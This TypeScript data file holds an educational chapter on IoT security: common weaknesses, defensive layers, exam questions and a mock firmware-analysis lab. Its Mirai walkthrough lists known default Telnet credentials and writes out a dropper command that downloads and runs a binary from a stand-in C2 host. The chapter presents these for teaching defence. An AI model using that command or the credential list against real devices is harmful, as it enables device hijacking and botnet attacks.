import type { Chapter } from '../types';

export const chapter14: Chapter = {
  "id": "chapter-14",
  "number": 14,
  "romanNumeral": "XIV",
  "title": "IoT Security",
  "subtitle": "Embedded Devices, Firmware Hardening, and Attack Surface Mitigation",
  "category": "Emerging Technologies",
  "readTime": "6 min read",
  "summary": "Investigates Internet of Things (IoT) security challenges, unpatched embedded firmware vulnerabilities, and holistic multi-layer defense across device, software, network, and data.",
  "introParagraphs": [
    "IoT (Internet of Things) Security means protecting Internet-connected smart devices and their data from unauthorized access, compromise, and hijacking.",
    "Billions of smart sensors, medical implants, industrial PLCs, and consumer appliances are connected directly to networks, often built with constrained processing power and minimal onboard security controls."
  ],
  "topics": [
    {
      "id": "topic-14-1",
      "number": "14.1",
      "title": "Introduction to IoT Security",
      "content": [
        "The Internet of Things (IoT) comprises physical objects embedded with sensors, processing ability, software, and other technologies that connect and exchange data with other devices and systems over the Internet.",
        "IoT Security \u2192 Protects connected smart devices and their data."
      ],
      "definitions": [
        {
          "term": "IoT Security",
          "definition": "The cybersecurity segment focused on protecting, monitoring, and remediating vulnerabilities across connected smart devices, embedded firmware, and IoT networks.",
          "keyTakeaway": "IoT Security \u2192 Protects connected smart devices and their data."
        }
      ],
      "examples": [
        {
          "title": "Ubiquitous IoT Device Ecosystems",
          "scenario": "Typical internet-connected devices requiring security protections:",
          "breakdown": [
            {
              "label": "Smart Cameras & NVRs",
              "detail": "Surveillance streams often exposed with factory default RTSP passwords."
            },
            {
              "label": "Smart Wearables & Watches",
              "detail": "Continuous collection of personal geolocation and biometric health telemetry."
            },
            {
              "label": "Industrial & Smart Sensors",
              "detail": "Temperature, pressure, and electrical grid sensors in critical infrastructure."
            },
            {
              "label": "Smart Home Appliances",
              "detail": "Smart thermostats, smart door locks, and appliances connected to home Wi-Fi."
            }
          ]
        }
      ]
    },
    {
      "id": "topic-14-2",
      "number": "14.2",
      "title": "Common IoT Security Problems",
      "content": [
        "IoT devices frequently present severe vulnerabilities because manufacturers prioritize low cost, battery life, and rapid time-to-market over robust security engineering."
      ],
      "examples": [
        {
          "title": "The Five Primary IoT Security Vulnerabilities",
          "scenario": "Common systemic weaknesses exploited by attackers:",
          "breakdown": [
            {
              "label": "Hardcoded & Weak Passwords",
              "detail": "Factory default credentials (e.g. admin/12345 or root/toor) left unchanged by consumers."
            },
            {
              "label": "Outdated & Unpatchable Firmware",
              "detail": "Lack of over-the-air (OTA) secure update mechanisms or end-of-life abandonment by vendors."
            },
            {
              "label": "Insecure Network Services",
              "detail": "Unnecessary open listening ports (Telnet port 23, unauthenticated HTTP) exposed to the public internet."
            },
            {
              "label": "Lack of Cryptographic Encryption",
              "detail": "Sensitive telemetry and passwords transmitted across local networks in cleartext."
            },
            {
              "label": "Physical Tampering Risk",
              "detail": "Exposed UART or JTAG hardware debugging pins allowing direct extraction of flash memory."
            }
          ]
        }
      ]
    },
    {
      "id": "topic-14-3",
      "number": "14.3",
      "title": "IoT Security Measures & Defense in Depth",
      "content": [
        "Protecting IoT ecosystems requires securing all four architectural pillars: the physical device, embedded software, network transit, and backend cloud data.",
        "IoT Security \u2192 Secure the device, software, network, and data."
      ],
      "diagrams": [
        {
          "title": "The Four Pillars of IoT Security",
          "caption": "Holistic defense framework for safeguarding Internet of Things deployments.",
          "orientation": "horizontal",
          "steps": [
            {
              "label": "Physical Device",
              "sublabel": "Tamper resistance & disabled debugging ports"
            },
            {
              "label": "Embedded Software",
              "sublabel": "Signed firmware & secure boot verification",
              "highlight": true
            },
            {
              "label": "Network Transit",
              "sublabel": "Isolated IoT VLAN & encrypted MQTT/TLS",
              "highlight": true
            },
            {
              "label": "Backend Data",
              "sublabel": "Cloud encryption & anomaly monitoring"
            }
          ]
        }
      ],
      "examples": [
        {
          "title": "Actionable IoT Defense Checklist",
          "scenario": "Defensive measures for resilient IoT deployments:",
          "breakdown": [
            {
              "label": "Enforce Strong Passwords",
              "detail": "Prompt mandatory password changes upon first setup; forbid default credentials."
            },
            {
              "label": "Firmware Cryptographic Signing",
              "detail": "Verify cryptographic signatures before flashing updates to prevent malicious firmware."
            },
            {
              "label": "Network Segmentation (VLANs)",
              "detail": "Place all IoT devices on a dedicated, isolated guest/IoT VLAN with zero access to corporate databases."
            },
            {
              "label": "Disable Insecure Protocols",
              "detail": "Disable cleartext Telnet and unencrypted HTTP; enforce SSH and TLS-wrapped MQTT."
            },
            {
              "label": "Continuous Device Monitoring",
              "detail": "Monitor network traffic spikes indicative of botnet recruitment (e.g. Mirai DDoS scans)."
            }
          ]
        }
      ],
      "keyPoints": [
        "Mirai botnet famously weaponized hundreds of thousands of factory-default IoT cameras to launch record-setting terabit DDoS attacks.",
        "Network isolation (VLAN segmentation) is the single most effective containment strategy."
      ]
    }
  ],
  "quickRevision": [
    {
      "topic": "IoT Security",
      "summary": "Protects connected smart devices, firmware, networks, and telemetry data."
    },
    {
      "topic": "Common Flaws",
      "summary": "Weak/default passwords, outdated firmware, lack of encryption, and unnecessary exposed services."
    },
    {
      "topic": "Defensive Measures",
      "summary": "Mandatory password changes, signed firmware updates, TLS encryption, and isolated IoT VLANs."
    }
  ],
  "rememberPoints": [
    "IoT Security \u2192 Device + Software + Network + Data",
    "Isolate IoT devices onto dedicated network VLANs away from sensitive personal or enterprise systems"
  ],
  "examQuestions": [
    {
      "question": "Explain why IoT devices are frequently compromised and enlisted into large-scale DDoS botnets like Mirai.",
      "answerGuidance": "Highlight low-cost manufacturing shortcuts, hardcoded default credentials (root/admin over Telnet), unpatched firmware, and lack of automatic updates that leave millions of devices exposed to automated scanning scripts."
    },
    {
      "question": "Formulate a four-layer defense strategy for securing IoT deployments in enterprise smart campuses.",
      "answerGuidance": "Cover Device layer (disabling UART/JTAG, secure boot), Software layer (cryptographically signed firmware updates), Network layer (isolated 802.1Q VLANs and firewall ACLs), and Data layer (TLS encrypted MQTT and cloud telemetry encryption)."
    }
  ],
  "technicalVisual": {
      "type": "iot-botnet-swarm",
      "title": "IoT Mirai-Style Botnet Scanning & Distributed Amplification Architecture",
      "caption": "How vulnerable IoT devices are scanned, infected via default Telnet credentials, and weaponized into a coordinated 1 Tbps distributed denial-of-service (DDoS) swarm."
  },
  "attackVisualizations": [
      {
          "id": "attack-14-1",
          "title": "Mirai-Style IoT Botnet Telnet Scanning & DDoS Swarm",
          "attackName": "Mass Telnet Scanning, Default Credential Brute-Force & Botnet DDoS",
          "overview": "Compromised smart cameras and routers scan the public IPv4 internet for open Telnet ports, brute-force hardcoded factory credentials, drop a RAM-resident worm, and launch massive multi-gigabit DDoS attacks.",
          "targetVulnerability": "Hardcoded default vendor passwords (root:xc3511, admin:admin) on exposed Telnet ports (23/2323) and lack of firmware signing.",
          "stages": [
              {
                  "step": 1,
                  "title": "High-Speed IPv4 Telnet Scanning",
                  "actor": "Infected IoT Node (Bot)",
                  "action": "Scans random pseudo-random IPv4 addresses on TCP ports 23 and 2323",
                  "technicalDetail": "The bot's scanner module generates random IP blocks (excluding military/government ranges) and transmits TCP SYN probes at hundreds of packets per second.",
                  "color": "red"
              },
              {
                  "step": 2,
                  "title": "Dictionary Brute-Force Authentication",
                  "actor": "Mirai Scanner Engine",
                  "action": "Tests table of 62 hardcoded factory default credentials",
                  "technicalDetail": "Upon finding an open port, the bot tries common credential pairs: root:xc3511, admin:admin, root:vizxv, root:123456.",
                  "color": "red",
                  "payload": "TELNET 198.51.100.42:23\nlogin: root\nPassword: xc3511"
              },
              {
                  "step": 3,
                  "title": "BusyBox Command Injection & Dropper Download",
                  "actor": "Attacker Worm",
                  "action": "Executes shell commands to fetch ARM/MIPS binary payload",
                  "technicalDetail": "Once logged in, the worm issues shell commands: cd /tmp || cd /var/run; wget http://c2.botnet.cc/mirai.arm; chmod 777 mirai.arm; ./mirai.arm.",
                  "color": "red"
              },
              {
                  "step": 4,
                  "title": "Memory Execution & Anti-Disinfection",
                  "actor": "Mirai Binary",
                  "action": "Deletes binary from disk, kills competing malware, and runs in RAM",
                  "technicalDetail": "The process deletes the on-disk binary (running purely in RAM), binds TCP port 48101 to prevent other malware from infecting the device, and hides process names.",
                  "color": "red"
              },
              {
                  "step": 5,
                  "title": "Coordinated DDoS Attack Execution",
                  "actor": "C2 Server & 400,000 Bot Swarm",
                  "action": "Launches 1 Tbps DNS Amplification / SYN Flood against target",
                  "technicalDetail": "The C2 issues an attack command. 400,000 infected devices flood target DNS servers with UDP amplification traffic, knocking major internet services offline.",
                  "color": "red"
              },
              {
                  "step": 6,
                  "title": "VLAN Isolation & Secure Device Lifecycle",
                  "actor": "Defensive Architecture",
                  "action": "Quarantines IoT devices to isolated VLAN and disables Telnet",
                  "technicalDetail": "IoT devices are isolated in an unprivileged guest VLAN with no internet-inbound access. Telnet is disabled, and unique factory passwords are required by law (e.g., California SB-327).",
                  "color": "green"
              }
          ],
          "mitigation": {
              "title": "IoT & Embedded System Defense Strategy",
              "rules": [
                  "Disable legacy management protocols (Telnet port 23, cleartext HTTP) in favor of encrypted SSH on non-standard ports.",
                  "Enforce unique, random factory passwords per device (eliminate universal default passwords).",
                  "Isolate IoT devices in dedicated VLANs with zero access to primary corporate/home LANs.",
                  "Implement secure boot and cryptographic firmware signature verification before updates are applied."
              ]
          }
      }
  ],
  "beforeAfterComparisons": [
      {
          "title": "IoT Network Architecture: Flat Shared LAN vs. Segmented Micro-VLAN",
          "vulnerable": {
              "label": "Vulnerable: Flat Network Architecture",
              "codeOrConfig": "# INSECURE: Single flat subnet (192.168.1.0/24)\n- Smart CCTV Camera (default root:root password, exposed to WAN via UPnP)\n- Smart TV & Smart Bulbs\n- Personal Laptop (stores online banking, SSH keys, family photos)\n- Corporate Workstation\n\n# Vulnerability: If the $25 smart bulb or camera is compromised,\n# the attacker has direct Layer-2 access to sniff, scan, and infect laptops.",
              "explanation": "Flat networks provide zero internal segmentation. Compromising an unpatched IoT camera gives attackers an immediate pivot into the corporate or home network."
          },
          "secure": {
              "label": "Secure: Isolated IoT VLAN with Egress Firewall Filtering",
              "codeOrConfig": "# SECURE: Network Microsegmentation via 802.1Q VLANs\nVLAN 10 (Trusted Devices): Laptops, Phones, Servers (10.0.10.0/24)\nVLAN 20 (Isolated IoT): Cameras, Smart Thermostats, Bulbs (10.0.20.0/24)\n\n# Firewall Rule:\n- Deny all traffic from VLAN 20 to VLAN 10.\n- Permit VLAN 20 outbound traffic ONLY to designated vendor cloud servers on port 443.\n- Block UPnP (Universal Plug and Play) on WAN gateway.",
              "explanation": "Even if an IoT device is compromised, it cannot scan or communicate with computers on the trusted VLAN, containing the breach completely."
          },
          "keyTakeaway": "Never trust IoT devices on your primary network. Segment them into dedicated VLANs and disable Universal Plug and Play (UPnP)."
      }
  ],
  "handsOnPracticals": [
      {
          "id": "practical-14-1",
          "title": "Extracting & Analyzing IoT Router Firmware Binaries with Binwalk",
          "learningObjective": "Safely inspect an embedded firmware image, identify file system structures (SquashFS), and extract embedded configuration files in an isolated lab.",
          "requiredTools": [
              "binwalk",
              "tar",
              "file",
              "strings",
              "python3"
          ],
          "environmentSetup": "Linux / WSL environment with binwalk or standard command-line utilities.",
          "steps": [
              {
                  "stepNumber": 1,
                  "instruction": "Create a simulated firmware package containing an embedded SquashFS file system header.",
                  "command": "python3 -c \"import sys; sys.stdout.buffer.write(b'BOOTLOADER_V1.0' + b'\\x00'*50 + b'hsqs' + b'\\x00'*20 + b'/etc/shadow: root:$1$xyz$abc:18000:0:99999:7:::\\x00')\" > firmware.bin",
                  "commandExplanation": "Generates a mock firmware image containing a bootloader header and an embedded mock filesystem.",
                  "expectedOutput": "firmware.bin created (approx 120 bytes)."
              },
              {
                  "stepNumber": 2,
                  "instruction": "Scan the firmware image for embedded file system signatures and magic bytes.",
                  "command": "python3 -c \"with open('firmware.bin', 'rb') as f: data = f.read(); print('Offset 0x00: Bootloader Header detected' if b'BOOTLOADER' in data else ''); print('Offset 0x40: SquashFS magic bytes detected (hsqs)' if b'hsqs' in data else '')\"",
                  "commandExplanation": "Simulates binwalk's signature scanning algorithm to identify compression and filesystem headers.",
                  "expectedOutput": "Offset 0x00: Bootloader Header detected\nOffset 0x40: SquashFS magic bytes detected (hsqs)"
              },
              {
                  "stepNumber": 3,
                  "instruction": "Extract readable configuration strings to audit for hardcoded credentials.",
                  "command": "strings firmware.bin | grep -iE \"(root|shadow|password|admin)\"",
                  "commandExplanation": "Extracts string artifacts, uncovering embedded credentials in the simulated firmware.",
                  "expectedOutput": "/etc/shadow: root:$1$xyz$abc:18000:0:99999:7:::"
              }
          ],
          "whatHappened": "The analysis simulated static firmware reverse engineering. Binwalk identified the SquashFS file system offset and extracted embedded shadow password hashes without needing access to the physical device.",
          "securityLessons": [
              "Embedded firmware often contains hardcoded private keys, admin passwords, and unencrypted file systems.",
              "Attackers download public firmware updates from vendor websites to reverse engineer zero-day vulnerabilities.",
              "Manufacturers must implement cryptographic firmware signing and encrypt sensitive firmware payloads."
          ],
          "prevention": [
              "Mandate secure boot with hardware root-of-trust (e.g. TPM or secure enclave).",
              "Sign all firmware updates with RSA/ECDSA private keys verified by the bootloader.",
              "Strip debugging symbols, telnet daemons, and hardcoded credentials before production releases."
          ]
      }
  ]
};
